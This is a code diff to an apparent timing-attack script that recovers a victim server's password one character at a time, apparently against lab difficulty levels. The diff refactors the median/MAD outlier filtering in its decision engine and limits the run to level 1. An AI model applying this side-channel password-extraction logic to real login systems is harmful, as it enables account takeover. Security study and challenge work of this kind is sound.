@@ -61,6 +61,34 @@ class MeasuresCollector:
             if char in self.measurements[position]
         }
 
+def robust_median(
+    samples: List[int],
+    min_samples_for_filtering: int = 7,
+    mad_threshold: float = 3.5
+) -> float:
+    if not samples:
+        raise ValueError("No samples provided")
+
+    if len(samples) < min_samples_for_filtering:
+        return statistics.median(samples)
+
+    median = statistics.median(samples)
+
+    deviations = [abs(x - median) for x in samples]
+    mad = statistics.median(deviations)
+
+    if mad == 0:
+        return median
+
+    filtered = [
+        x for x in samples
+        if abs(x - median) / mad <= mad_threshold
+    ]
+
+    if len(filtered) < min_samples_for_filtering // 2:
+        return median
+
+    return statistics.median(filtered) 
 
 # ==========================
 # Victim Server Configuration
@@ -212,65 +240,50 @@ class AsyncSampler:
 
 
 class MedianDecisionEngine(DecisionEngine):
-    """Decision engine using median timing and MAD-based outlier removal."""
-    def __init__(self, min_samples: int = 2):
-        """Initialize engine.
+    """Decision engine using robust median timing."""
 
-        Args:
-            min_samples: Minimum number of valid samples required per character.
-        """
+    def __init__(
+        self,
+        min_samples: int = 2,
+        min_samples_for_filtering: int = 7,
+        mad_threshold: float = 3.5,
+    ):
         self.min_samples = min_samples
+        self.min_samples_for_filtering = min_samples_for_filtering
+        self.mad_threshold = mad_threshold
 
     def decide(self, candidates: Dict[str, List[int]]) -> str:
-        """Return the single best candidate.
-
-        Args:
-            candidates: Mapping of character -> list of timing samples.
-
-        Returns:
-            Best character or empty string if no decision possible.
-        """
         top = self.decide_top_k(candidates, top_k=1)
         return top[0][0] if top else ""
 
-    def decide_top_k(self, candidates: Dict[str, List[int]], top_k: int = 3) -> List[Tuple[str, float]]:
-        """Return top-k characters ranked by median timing (higher = slower = likely correct).
+    def decide_top_k(
+        self, candidates: Dict[str, List[int]], top_k: int = 3
+    ) -> List[Tuple[str, float]]:
 
-        Uses Median Absolute Deviation (MAD) for outlier removal when enough samples exist.
-
-        Args:
-            candidates: Mapping of character -> list of timing samples.
-            top_k: Number of top candidates to return.
-
-        Returns:
-            List of (character, time_delta) tuples sorted descending by delta.
-        """
         if not candidates:
             return []
 
-        cleaned = {}
+        medians: Dict[str, float] = {}
+
         for char, times in candidates.items():
             if len(times) < self.min_samples:
                 continue
 
-            med = statistics.median(times)
+            medians[char] = robust_median(
+                times,
+                min_samples_for_filtering=self.min_samples_for_filtering,
+                mad_threshold=self.mad_threshold,
+            )
 
-            # Remove outliers in case we have enough samples
-            if len(times) > 3:
-                mad = statistics.median([abs(t - med) for t in times])
-                if mad > 0:
-                    times = [t for t in times if abs(t - med) <= 3 * mad]
-            cleaned[char] = statistics.median(times) if times else med
-
-        if not cleaned:
+        if not medians:
             return []
 
-        min_time = min(cleaned.values())
-        scores = [(c, t - min_time) for c, t in cleaned.items()]
+        baseline = min(medians.values())
+        scores = [(c, t - baseline) for c, t in medians.items()]
         scores.sort(key=lambda x: x[1], reverse=True)
+
         return scores[:top_k]
     
-
 # ==========================
 # TimingAttacker - main logic
 # ==========================
@@ -369,6 +382,7 @@ class TimingAttacker:
         sorted_med = sorted(medians.items(), key=lambda x: x[1], reverse=True)
         best_char, best_time = sorted_med[0]
         second_time = sorted_med[1][1] if len(sorted_med) > 1 else best_time
+
         return best_time - second_time, best_char
 
     async def _attack_position(
@@ -546,7 +560,7 @@ async def main():
     victim = VictimServer(url=BASE_URL)
 
     total_start_ns = time.perf_counter()
-    for difficulty in range(1, MAX_DIFFICULTY + 1):
+    for difficulty in [1]: #range(1, MAX_DIFFICULTY + 1):
         start_ns = time.perf_counter()
         password = await commit_full_attack(username=USERNAME, victim=victim, difficulty=difficulty)
         print(f"    [{time.ctime()}] | level_time: {(time.perf_counter() - start_ns) / 60} difficulty ({difficulty}) | password: {password}")
